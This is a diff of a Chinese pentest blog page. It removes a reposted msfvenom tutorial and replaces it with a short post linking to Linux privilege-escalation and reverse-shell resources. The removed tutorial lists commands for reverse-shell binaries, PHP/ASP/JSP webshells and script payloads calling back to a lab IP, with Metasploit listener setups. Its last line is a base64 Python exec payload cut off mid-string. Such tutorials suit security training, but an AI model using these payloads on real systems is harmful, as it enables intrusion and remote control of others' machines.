@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>生成msf常用payload | Hexo</title>
-  <meta name="keywords" content=" 博客 , 工具 ">
-  <meta name="description" content="生成msf常用payload | Hexo">
+  <title>linux提权一条龙 | Hexo</title>
+  <meta name="keywords" content=" linux提权 , nc升级为完整shell ">
+  <meta name="description" content="linux提权一条龙 | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="htb之Cronos nmap 收集一下信息 10.10.10.13PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)80/">
 <meta name="keywords" content="博客,htb">
@@ -249,9 +249,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-生成msf常用payload" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-linux提权一条龙" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">生成msf常用payload</h1>
+        <h1 class="article-title">linux提权一条龙</h1>
     
     <div class="article-meta">
         
@@ -266,16 +266,16 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">博客</a>
+            <a href="javascript:" class="color3">linux提权</a>
             
-            <a href="javascript:" class="color3">工具</a>
+            <a href="javascript:" class="color3">nc升级为完整shell</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-10 16:42:07'>2019-10-10 16:35</time>
+        创建时间:<time class="date" title='更新时间: 2019-10-15 17:37:10'>2019-10-15 17:28</time>
         
     </div>
     <div class="article-meta">
@@ -313,98 +313,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>转载原地址：<a href="http://www.myh0st.cn/index.php/archives/67/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/67/</a><br>msf作为一款强大的漏洞检测工具，如何生成适用于msf的payload以及如何利用是使用msf的关键，今天就主要记录一下常用的payload以及如何使用。生成payload使用的工具是MSFVenom，下面看看他的帮助信息。</p>
-<p>在kali下可以使用如下命令列出MSFVenom可以生成的payload列表：</p>
-<p>msfvenom -l</p>
-<p>生成二进制文件<br>关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。</p>
-<blockquote>
-<p>Windows<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f exe &gt; shell.exe</your></your></p>
-</blockquote>
-<blockquote>
-<p>Linux<br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f elf &gt; shell.elf</your></your></p>
-</blockquote>
-<blockquote>
-<p>Mac<br>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f macho &gt; shell.macho</your></your></p>
-</blockquote>
-<p>如何利用<br>针对这个部分就以Windows为例，使用上面的命令生成一个exe的payload，命令如下：</p>
-<blockquote>
-<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.128 LPORT=4444 -f exe &gt; shell.exe</p>
-</blockquote>
-<p>复制shell.exe到Windows机器，然后kali下开启msf使用如下命令监听4444端口：</p>
-<blockquote>
-<p>msfconsole</p>
-<p>use exploit/multi/handler</p>
-<p>set PAYLOAD windows/meterpreter/reverse_tcp</p>
-<p>set LHOST 192.168.88.128</p>
-<p>set LPORT 4444</p>
-<p>set ExitOnSession false</p>
-<p>exploit -j -z</p>
-</blockquote>
-<p>在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：</p>
-<p>双击运行<br>cmd下运行exe<br>利用Powershell远程下载执行<br>利用at或schtasks设置计划任务执行<br>利用wmic远程命令执行<br>其他的方式请各位补充<br>生成webshell脚本<br>在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，如何使用MSFVenom生成一个可以用msf操作的webshell呢？</p>
-<blockquote>
-<p>PHP<br>msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.php</your></your></p>
-</blockquote>
-<p>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p>
-<blockquote>
-<p>ASP<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f asp &gt; shell.asp</your></your></p>
-</blockquote>
-<blockquote>
-<p>JSP<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.jsp</your></your></p>
-</blockquote>
-<blockquote>
-<p>WAR<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f war &gt; shell.war</your></your></p>
-</blockquote>
-<p>如何利用<br>下面以php为例做一下测试，使用以下命令生成一个webshell：</p>
-<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.88.128 LPORT=4444 -f raw &gt; shell.php</p>
-<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
-<blockquote>
-<p>msfconsole</p>
-<p>use exploit/multi/handler</p>
-<p>set PAYLOAD php/meterpreter_reverse_tcp</p>
-<p>set LHOST 192.168.88.128</p>
-<p>set LPORT 4444</p>
-<p>set ExitOnSession false</p>
-<p>exploit -j -z</p>
-</blockquote>
-<p>将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
-<blockquote>
-<p>php shell.php</p>
-</blockquote>
-<p>脚本shell<br>关于使用脚本反弹shell的方式，主要以python、bash、perl为例。</p>
-<blockquote>
-<p>Python<br>msfvenom -p cmd/unix/reverse_python LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.py</your></your></p>
-</blockquote>
-<blockquote>
-<p>Bash<br>msfvenom -p cmd/unix/reverse_bash LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.sh</your></your></p>
-</blockquote>
-<blockquote>
-<p>Perl<br>msfvenom -p cmd/unix/reverse_perl LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.pl</your></your></p>
-</blockquote>
-<blockquote>
-<p>Powershell<br>msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<your ip address> LPORT=<your port to connect on> -f psh &gt; shell.ps1</your></your></p>
-</blockquote>
-<blockquote>
-<p>powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
-</blockquote>
-<p>如何使用<br>下面就以Python为例做一下测试，使用以下命令生成一个脚本：</p>
-<blockquote>
-<p>msfvenom -p cmd/unix/reverse_python LHOST=192.168.88.128 LPORT=4444 -f raw &gt; shell.py</p>
-</blockquote>
-<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
-<blockquote>
-<p>msfconsole</p>
-<p>use exploit/multi/handler</p>
-<p>set PAYLOAD cmd/unix/reverse_python</p>
-<p>set LHOST 192.168.88.128</p>
-<p>set LPORT 4444</p>
-<p>set ExitOnSession false</p>
-<p>exploit -j -z</p>
-</blockquote>
-<p>然后复制shell.py中的内容在linux命令行下执行，如下：</p>
-<blockquote>
-<p>python -c “exec(‘aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY</p>
-</blockquote>
+        <p>linux提权脚本大全：<a href="https://www.freebuf.com/sectool/121847.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/121847.html</a><br>nc提升为完整shell：<a href="https://wx.abbao.cn/a/13847-7cd1b6e418fa413b.html" target="_blank" rel="noopener">https://wx.abbao.cn/a/13847-7cd1b6e418fa413b.html</a><br>反向壳备忘录：<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -414,12 +323,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>生成msf常用payload</p>
+    <p><span class="copy-title">文章标题:</span>linux提权一条龙</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-10, 16:35:19</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-10, 16:42:07</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/10/生成msf常用payload/" title="生成msf常用payload">https://manmachines.github.io/2019/10/10/生成msf常用payload/</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-15, 17:28:17</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-15, 17:37:10</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/15/linux提权一条龙/" title="linux提权一条龙">https://manmachines.github.io/2019/10/15/linux提权一条龙/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
